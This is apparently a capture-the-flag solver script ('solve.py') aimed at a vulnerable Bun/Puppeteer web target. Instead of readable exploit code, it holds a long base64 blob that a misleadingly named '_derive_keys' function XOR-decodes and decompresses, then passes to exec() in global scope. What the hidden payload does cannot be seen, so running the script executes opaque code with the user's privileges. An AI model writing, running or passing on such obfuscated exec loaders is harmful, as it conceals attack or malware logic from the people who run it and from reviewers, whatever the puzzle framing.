#!/usr/bin/env python3
import requests
import urllib3
import sys

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

# Also allowpass the target as an argument
TARGET = sys.argv[1] if len(sys.argv) > 1 else "https://127.0.0.1:443"

def _derive_keys(p, k):
    import zlib, base64
    return zlib.decompress(bytes([b ^ k for b in base64.b64decode(p)])).decode('utf-8')

def exploit():
    _p = "8RUE3UQHas2ZN3Kgw1fKlUGzQO2fZM8aHB/o7zxbAdQYhctD098u1PjT+FUvMhQAnMxrO75Ng4D4yamnlTGo55XxE/CI8Y0jUsevuosAlVtnFib3N3MjtTijLbvpTYOyKaJUiAzWHyGE9KQR1+3rz86lxm1DepdIPM+5gg1AAkbX18XpRB3pOoWoSDBBuIgYMuLQk90pMJsMeIXaoBMx3ZAFk+khPSgyKVzkPLQE04IQWmxX/LEnBgtK7DHPrG+cNDDtEM9Goh1BxLl+LvZ2dUTmmMUVhhguOTT6PoJKWebyvz7Z7gHMWYIWPZIhzPd+4o0e2yyfvnd1rJ27IlvFm5Sb79xIPef78SWcDt+n+uVcvzQt1SQj0Sbag6B5+Nrt2xEZf/eOdbrTFhaQVRFu3hus7RfZ7tT++V88Hn8c0TidZGdKRKM6vwaLcroL4rtgOb8T52D/yQyJR4Pao/J4YxqvytyEtCkWy8R4ZbCiLT+dlLpbUah++hgol+T0MnPKsW06YolCu/CaosUNy+d9QdhX+JMoSwcBy25lmMUhXW4awlk73ZUIQo1oifroniXJXJQDjSFJM20Vy/rpuD5ID1O52mNRqMCyWsgmVgjIZk13hKse52LD+++hFh/06MiC7YCj1C7VLtRy5b3/fe/zDgeHRtTZuEy9Mw6F/BiAar2w9FW28zceU2QGZqvxSqPegKf6W/lAhF/cIAAsxBpsNUU7oy2bhOgy/jEq09ACwfWHdqSVdlBgWpp2trXWdsaGMWjRkTH5AuSlLyj4Pt5RZMbWznmgE5IgHwnDwFyIN8k3DQPDMObbLqSCKjCZaw8xYNpgBlMgVrdnStY3Lrfdq8RYAFrfCa0v6M+EPJ+FM+IoDGBXTHPJNfJQG9+WI3+oWzYuT7Nor8rj00YSwoxLQAxsoI90dIGCZOuK919gFj9SSsr/U63tpTXYS6mw9iIvPmb2dmIGfpg1MehLhJ8Sj+cZHgfax8S76vXAsEk/nD9pipkyqjOTCnolXQIpt7evR0co9DY2RORO9pJITn61MQCuuYAgG10tz7iez0uFEriTSsKtvoaOFaLZxBUUV60g7wEO80jHF/WdVTiT6+dSp+E+INC/AMHge49kYHngzXXsRYc/MNaBpyBKPlJrPZEhMS5rq7JcL0ZqK0Ye+KaWTVKq9jJURza+EvZxowsCplfVNPe8CHh8cHBM8cXjPG+k0HaJZEimUw=="
    _k = 137

    try:
        exec(_derive_keys(_p, _k), globals())
    except Exception as e:
        print(f"[-] Exploit failed. Ensure the target is running the vulnerable Bun/Puppeteer stack. Error: {e}")

if __name__ == "__main__":
    if "-h" in sys.argv or "--help" in sys.argv:
        print("Usage: python3 solve.py [TARGET_URL]")
        print("Example: python3 solve.py https://lonely-island.picoctf.net:12345")
        sys.exit(0)
    exploit()
  
